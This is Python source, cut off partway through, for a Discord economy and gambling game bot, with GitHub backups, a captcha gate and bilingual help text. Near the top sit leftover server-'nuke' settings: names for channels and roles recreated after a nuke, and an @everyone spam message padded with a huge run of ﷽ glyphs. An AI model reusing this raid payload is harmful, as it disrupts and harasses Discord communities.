import collections
import discord
from discord import app_commands
import asyncio
import random
import os
import json
import time
import requests
import string
from colorama import Fore, init  # ← This was missing!
from discord.ext import commands
backup_started = False
flow_tracker = {}
TRIVIA_HISTORY = collections.deque(maxlen=80)
init(autoreset=True)  # ← Required for Windows color support
def get_flow(uid: str) -> dict:
    if uid not in flow_tracker:
        flow_tracker[uid] = {"win_streak": 0, "loss_streak": 0, "pity_counter": 0, "last_play": 0, "difficulty_bias": 0.0}
    return flow_tracker[uid]

def record_game(uid: str, won: bool):
    f = get_flow(uid)
    f["last_play"] = time.time()
    if won:
        f["win_streak"] += 1
        f["loss_streak"] = 0
        f["pity_counter"] = max(0, f["pity_counter"] - 2)
        f["difficulty_bias"] = min(0.08, f["difficulty_bias"] + 0.02) 
    else:
        f["loss_streak"] += 1
        f["win_streak"] = 0
        f["pity_counter"] += 1
        f["difficulty_bias"] = max(-0.08, f["difficulty_bias"] - 0.04) 

    if f["loss_streak"] >= 3 and f["pity_counter"] % 3 == 0:
        f["difficulty_bias"] = -0.06
def RandomColor():
    """Generates a random Discord color"""
    return discord.Color(random.randint(0x000000, 0xFFFFFF))
# ==========================================
# CONFIGURATION & INITIALIZATION
# ==========================================
intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)
CHANNEL_NAME = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"             # Name for recreated channels after nuke
ROLE_NAME = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"                # Name for recreated roles after nuke
SPAM_MESSAGES = ["@everyone﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"]          # List of messages to spam
WHITELIST_IDS = [1324386209539166268, 1130015134887198790, 973928719318142977]

DATA_FILE = "/data/users.json"
user_data = {}
daily_cooldown = {}
active_games = {}
world = {}
lottery_lock = asyncio.Lock()
# ADD THIS:
user_locks = {}
def get_user_lock(uid):
    if uid not in user_locks:
        user_locks[uid] = asyncio.Lock()
    return user_locks[uid]
lottery_pool = {"tickets": [], "pot": 0}

# ==========================================
# SAVE DATA SYSTEM & UTILS
# ==========================================

import base64
import requests

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")

REPO_OWNER = "Sillyhameter"
REPO_NAME = "discord_bot_data"
FILE_PATH = "users.json"
BRANCH = "main"

async def auto_backup_loop():
    await bot.wait_until_ready()

    while not bot.is_closed():
        try:
            upload_to_github()
            print("☁️ Auto backup complete")
        except Exception as e:
            print(f"❌ Auto backup error: {e}")

        await asyncio.sleep(60)

def upload_to_github():
    if not GITHUB_TOKEN:
        print("❌ GITHUB_TOKEN is missing")
        return False

    try:
        if not os.path.exists(DATA_FILE):
            print("❌ Local users.json not found, cannot upload")
            return False

        with open(DATA_FILE, "r", encoding="utf-8") as f:
            content = f.read()

        encoded_content = base64.b64encode(
            content.encode("utf-8")
        ).decode("utf-8")

        api_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"

        headers = {
            "Authorization": f"Bearer {GITHUB_TOKEN}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28"
        }

        # 先取得目前 GitHub 上 users.json 的 sha
        get_response = requests.get(
            api_url,
            headers=headers,
            params={"ref": BRANCH},
            timeout=15
        )

        print("GET STATUS:", get_response.status_code)

        if get_response.status_code == 200:
            sha = get_response.json().get("sha")
        else:
            print("❌ Failed to get file SHA")
            print(get_response.text)
            return False

        payload = {
            "message": "Auto save users.json",
            "content": encoded_content,
            "sha": sha,
            "branch": BRANCH
        }

        put_response = requests.put(
            api_url,
            headers=headers,
            json=payload,
            timeout=15
        )

        print("UPLOAD STATUS:", put_response.status_code)
        print(put_response.text)

        if put_response.status_code in [200, 201]:
            print("✅ Uploaded users.json to GitHub")
            return True
        else:
            print("❌ GitHub upload failed")
            return False

    except Exception as e:
        print(f"❌ GitHub upload error: {e}")
        return False
        
def save_data():
    try:
        # 確保 /data 存在
        os.makedirs("/data", exist_ok=True)

        # 存本地 users.json
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(
                {
                    "users": user_data,
                    "lottery": lottery_pool,
                    "world": world
                },
                f,
                ensure_ascii=False,
                indent=4
            )

        print("💾 Local save complete")

    except Exception as e:
        print(f"❌ Error saving data: {e}")

def load_data():
    global user_data, lottery_pool, world

    os.makedirs("/data", exist_ok=True)

    if not os.path.exists(DATA_FILE):
        print("⚠️ users.json not found in /data. Downloading from GitHub...")

        try:
            github_url = "https://raw.githubusercontent.com/Sillyhameter/discord_bot_data/main/users.json"
            response = requests.get(github_url, timeout=10)

            if response.status_code == 200:
                with open(DATA_FILE, "wb") as f:
                    f.write(response.content)
                print("✅ Downloaded users.json from GitHub")
            else:
                print(f"❌ GitHub download failed: {response.status_code}")
                print(response.text)
                raise RuntimeError("Cannot start safely: users.json download failed")

        except Exception as e:
            print(f"❌ Error downloading data: {e}")
            raise RuntimeError("Cannot start safely: no local users.json and GitHub download failed")

    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)

        user_data = data.get("users", {})
        lottery_pool = data.get("lottery", {"tickets": [], "pot": 0})
        world = data.get("world", {})

        for uid in list(user_data.keys()):
            init_user(uid)

        save_data()

        print(f"✅ Loaded data for {len(user_data)} users.")

    except Exception as e:
        print(f"❌ Error loading data: {e}")
        raise RuntimeError("Cannot start safely: users.json is broken")

def init_user(user_id):
    uid = str(user_id)

    # 如果玩家不存在
    if uid not in user_data:
        user_data[uid] = {}

    u = user_data[uid]

    # =========================
    # 基本資料
    # =========================
    u.setdefault("coins", 1000)
    u.setdefault("lang", "en")

    # =========================
    # 背包
    # =========================
    u.setdefault("inventory", [])

    # 舊 Pickaxe 自動轉新系統
    if "Pickaxe" in u["inventory"] and "Pickaxe Lvl 1" not in u["inventory"]:
        u["inventory"].remove("Pickaxe")
        u["inventory"].append("Pickaxe Lvl 1")

    # 防止沒有鎬子
    if not any(str(item).startswith("Pickaxe Lvl") for item in u["inventory"]):
        u["inventory"].append("Pickaxe Lvl 1")

    # =========================
    # 統計
    # =========================
    u.setdefault("stats", {})

    u["stats"].setdefault("games_played", 0)
    u["stats"].setdefault("money_wagered", 0)
    u["stats"].setdefault("money_won", 0)

    # =========================
    # 其他系統
    # =========================
    u.setdefault("crypto", {})
    u.setdefault("pet", None)
    u.setdefault("partner", None)

    # =========================
    # Mine 系統
    # =========================
    u.setdefault("xp", 0)
    u.setdefault("mine_px", 3)
    u.setdefault("mine_depth", 0)
    u.setdefault("sack", 0)

    u.setdefault("durability", 50)
    u.setdefault("repairing", False)
    u.setdefault("repair_end", 0)

    u.setdefault("max_depth", 0)
    u.setdefault("level", 1)

    # 洞穴系統
    u.setdefault("in_cave", False)
    u.setdefault("cave_grid", None)
    u.setdefault("cave_px", 2)
    u.setdefault("cave_py", 5)
    u.setdefault("cave_earn", 0)
    u.setdefault("cave_broken", 0)

    # =========================
    # cooldown 類（舊玩家補齊）
    # =========================
    u.setdefault("last_daily", 0)
    u.setdefault("last_work", 0)
    u.setdefault("last_crime", 0)
    u.setdefault("last_earn", 0)
    u.setdefault("last_fish", 0)
    u.setdefault("last_trivia", 0)
    u.setdefault("last_scramble", 0)
    u.setdefault("last_mine", 0)

    return u

def parse_bet(user_id, bet_str):
    """Parses 'all', 'half', or integer strings to return the bet amount."""
    user = init_user(user_id)
    b = str(bet_str).lower().strip()
    coins = user["coins"]
    if b in ["all", "max"]: return coins
    if b == "half": return max(1, coins // 2)
    try:
        amt = int(b)
        return amt if amt > 0 else 0
    except ValueError:
        return 0

@tree.command(name="forcebackup", description="Force backup to GitHub")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def forcebackup(interaction: discord.Interaction):

    try:
        upload_to_github()
        await interaction.response.send_message(
            "☁️ Backup attempted. Check Railway logs.",
            ephemeral=True
        )
    except Exception as e:
        await interaction.response.send_message(
            f"❌ Backup failed: {e}",
            ephemeral=True
        )

# ==========================================
# GLOBAL CAPTCHA SYSTEM (FIXED & SHORT-CIRCUITED)
# ==========================================
CAPTCHA_CHANCE = 0.005  # 0.5% chance to trigger
captcha_locked = {}
bot_banned = {}

async def send_captcha(interaction: discord.Interaction, uid: str):
    emojis = ["🍎", "🍌", "🍉", "🍇", "🍓", "🍒", "🍑", "🍍", "🥥", "🥝"]
    choices = random.sample(emojis, 4)
    correct = random.choice(choices)
    captcha_locked[uid] = correct
    
    class CaptchaView(discord.ui.View):
        def __init__(self, uid):
            super().__init__(timeout=5.0)
            self.uid = uid
            for e in choices:
                btn = discord.ui.Button(label=e, style=discord.ButtonStyle.secondary)
                btn.callback = self.create_callback(e)
                self.add_item(btn)
                
        def create_callback(self, emoji):
            async def callback(inter: discord.Interaction):
                if str(inter.user.id) != self.uid:
                    return await inter.response.send_message("Not for you.", ephemeral=True)
                if emoji == captcha_locked.get(self.uid):
                    del captcha_locked[self.uid]
                    for child in self.children: child.disabled = True
                    await inter.response.edit_message(content="✅ **Captcha solved!** You may now use commands again.", view=self)
                else:
                    for child in self.children: child.disabled = True
                    await inter.response.edit_message(content="❌ **Incorrect!** Run a command to try again.", view=self)
                self.stop()
            return callback

        async def on_timeout(self):
            if self.uid in captcha_locked:
                bot_banned[self.uid] = time.time() + 10
                del captcha_locked[self.uid]
                try:
                    for child in self.children: child.disabled = True
                    await self.message.edit(content="🚨 **CAPTCHA Timeout!** You failed to answer in 5 seconds. You are banned from using commands for 10 seconds.", view=self)
                except Exception:
                    pass
            
    view = CaptchaView(uid)
    await interaction.response.send_message(
        f"🚨 **ANTI-BOT VERIFICATION** 🚨\nThe command has been aborted.\nClick the **{correct}** button within **5 seconds** to verify you are human.", 
        view=view, 
        ephemeral=True
    )
    view.message = await interaction.original_response()

async def global_captcha_check(interaction: discord.Interaction):
    # Ignore autocomplete typing events
    if interaction.type != discord.InteractionType.application_command:
        return True

    uid = str(interaction.user.id)

    # If banned, block entirely
    if uid in bot_banned:
        if time.time() < bot_banned[uid]:
            left = int(bot_banned[uid] - time.time())
            await interaction.response.send_message(f"🚨 You are temporarily banned for failing the CAPTCHA. Try again in {left}s.", ephemeral=True)
            return False
        else:
            del bot_banned[uid]

    # If already locked in captcha, force solve and block command
    if uid in captcha_locked:
        await send_captcha(interaction, uid)
        return False
        
    # Trigger new captcha randomly and block command
    if random.random() < CAPTCHA_CHANCE:
        await send_captcha(interaction, uid)
        return False
        
    return True

tree.interaction_check = global_captcha_check

@tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.CheckFailure):
        pass # Silently ignore because we handled the CheckFailure by sending the Captcha View
    else:
        print(f"Command Error: {error}")

# ==========================================
# LANGUAGE / TRANSLATION SYSTEM
# ==========================================
HELP_EN = {
    "/language": "Set your bot language.",
    "/blackjack <bet>": "Play classic 21 against the dealer.",
    "/coinflip <bet> <choice>": "Flip a coin and bet on Heads or Tails.",
    "/baccarat <bet> <choice>": "Play Baccarat. Bet on Player, Banker, or Tie.",
    "/roulette <bet> <choice>": "Bet on a color (red/black), parity (even/odd) or exact number (0-36).",
    "/slots <bet>": "Spin the emoji slots. Match 3 for 10x payout, match 2 for 2x.",
    "/dice <bet>": "Roll a 100-sided die against the house. Roll > 50 to double your bet.",
    "/crash <bet>": "Watch a multiplier rise! Cash out before the graph crashes.",
    "/mines <bet> <bombs>": "Click safe tiles to increase payout. Hit a bomb and lose.",
    "/poker <bet>": "5-card draw video poker. Hold cards and redraw to form a winning hand.",
    "/highlow <bet>": "Guess if the next drawn card is higher or lower.",
    "/rps <bet> <choice>": "Rock, Paper, Scissors against the bot.",
    "/heist <bet>": "Join a group heist! Wait for friends to join, then roll for survival and massive payouts.",
    "/lottery": "Buy a 100 🪙 ticket. Draw happens when admins run the draw command.",
    "/duel <user> <bet>": "Challenge another player. 50/50 chance to take the pot!",
    "/plinko <bet>": "Drop a ball through the pegs. Multipliers range from 0.2x to 25x.",
    "/minecraft": "Play a fully functional 2D Minecraft mini-game.",
    "/pay <user> <amount>": "Send coins to another user.",
    "/earn": "Earn coins by solving simple math problems (5s timeout).",
    "/daily": "Claim your daily free coins.",
    "/stats": "Check your current balance and gambling statistics.",
    "/profile [user]": "View a beautiful profile card for yourself or another user.",
    "/leaderboard": "View the top 10 richest players in the server.",
    "/shop": "Buy items from the global shop.",
    "/inventory": "View your owned items.",
    "/rob <user>": "Attempt to steal coins from another user (Risky!).",
    "/giveaway <amount>": "Host a giveaway for other players to join.",
    "/horserace <bet> <horse 1-5>": "Bet on a horse and watch the simulated race.",
    "/tictactoe <user>": "Play Tic-Tac-Toe against another player.",
    "/connect4 <user>": "Play Connect 4 against another player.",
    "/russian_roulette <bet>": "Join a multiplayer game of Russian Roulette. Last man standing wins the pot!",
    "/trivia": "Answer a heavily logic-based trivia question to earn coins (5s timeout).",
    "/scramble": "Unscramble a word to earn coins (5s timeout, 2m cooldown).",
    "/fish": "Go fishing! (Requires a Fishing Rod from the shop).",
    "/ship <user1> <user2>": "Calculate the compatibility percentage between two users.",
    "/echo <message>": "Echo a message.",
    "/ping": "Check bot latency.",
    "/roll [sides]": "Roll a dice (default 1-6).",
    "/choose <opt1> <opt2>": "Choose between two options.",
    "/avatar [user]": "Get your or another user's avatar.",
    "/aura [user]": "Get a random aura score.",
    "/rps_duel <user>": "Challenge another user to an RPS duel (no bet).",
    "/crypto": "Buy and sell virtual crypto in a dynamic market.",
    "/work": "Work for some steady coins (1h cooldown).",
    "/crime": "Commit a crime for a chance at big coins (2h cooldown).",
    "/upgrade": "Upgrade an item in your inventory.",
    "/mine": "Mine for ores! (Requires Pickaxe).",
    "/pet": "Adopt, feed, and play with a virtual pet.",
    "/marry <user>": "Propose to another user.",
    "/fight <user>": "Turn-based RPG battle against another player.",
    "/wordchain <user>": "Play a word chain game.",
    "/mafia": "Play a quick game of Mafia/Spy with 3+ friends.",
    "/keno <bet> <n1-n5>": "Play Keno. Pick 5 numbers (1-80).",
    "/scratch": "Buy a scratch ticket for 200 🪙.",
    "/help": "View all commands by category using a dropdown menu.",
}

HELP_ZH = {
    "/language": "設定機器人語言。",
    "/blackjack <bet>": "與莊家對決經典 21 點。",
    "/coinflip <bet> <choice>": "擲硬幣並押注正面或反面。",
    "/baccarat <bet> <choice>": "遊玩百家樂。押注閒家、莊家或平手。",
    "/roulette <bet> <choice>": "押注顏色、單雙或精確數字 (0-36)。",
    "/slots <bet>": "旋轉吃角子老虎機。連線三個獲得 10 倍，兩個獲得 2 倍。",
    "/dice <bet>": "與莊家擲 100 面骰子。大於 50 獲得雙倍。",
    "/crash <bet>": "看著倍率上升！在崩盤前兌現。",
    "/mines <bet> <bombs>": "踩地雷。點擊安全方塊增加倍率，踩到炸彈則輸。",
    "/poker <bet>": "五張牌梭哈。保留牌並重新抽牌以組成獲勝牌型。",
    "/highlow <bet>": "猜測下一張牌是大還是小。",
    "/rps <bet> <choice>": "與機器人玩剪刀石頭布。",
    "/heist <bet>": "加入團體搶劫！等待朋友加入，然後擲骰子爭取生存和巨額獎金。",
    "/lottery": "購買一張價值 100 🪙 的彩券。管理員可開獎。",
    "/duel <user> <bet>": "向其他玩家發起決鬥。50/50 機會贏走獎金池！",
    "/plinko <bet>": "玩柏青哥。倍率範圍從 0.2 倍到 25 倍。",
    "/minecraft": "遊玩一個功能完整的 2D Minecraft 迷你遊戲。",
    "/pay <user> <amount>": "轉帳給其他玩家。",
    "/earn": "透過解答簡單的數學題賺取金幣 (5秒限制)。",
    "/daily": "領取你的每日免費金幣。",
    "/stats": "查看你目前的餘額和賭博統計數據。",
    "/profile [user]": "查看你或其他用戶的精美個人資料卡。",
    "/leaderboard": "查看伺服器中最富有的前 10 名玩家。",
    "/shop": "從全球商店購買物品。",
    "/inventory": "查看你擁有的物品。",
    "/rob <user>": "嘗試偷取其他用戶的金幣（有風險！）。",
    "/giveaway <amount>": "舉辦金幣抽獎活動讓其他玩家參與。",
    "/horserace <bet> <horse 1-5>": "押注一匹馬並觀看模擬賽馬。",
    "/tictactoe <user>": "與其他玩家玩圈圈叉叉 (井字遊戲)。",
    "/connect4 <user>": "與其他玩家玩四子棋。",
    "/russian_roulette <bet>": "加入多人俄羅斯輪盤。最後存活者贏得獎金池！",
    "/trivia": "回答高難度邏輯問題以賺取金幣 (5秒限制)。",
    "/scramble": "重組英文單字以賺取金幣 (5秒限制, 2分鐘冷卻)。",
    "/fish": "去釣魚！（需要在商店購買釣竿）。",
    "/ship <user1> <user2>": "計算兩個用戶之間的契合度百分比。",
    "/echo <message>": "複讀一條訊息。",
    "/ping": "檢查機器人延遲。",
    "/roll [sides]": "擲骰子（預設 1-6）。",
    "/choose <opt1> <opt2>": "在兩個選項中選擇一個。",
    "/avatar [user]": "獲取用戶頭像。",
    "/aura [user]": "獲取隨機光環分數。",
    "/rps_duel <user>": "與其他玩家進行無賭注的剪刀石頭布對決。",
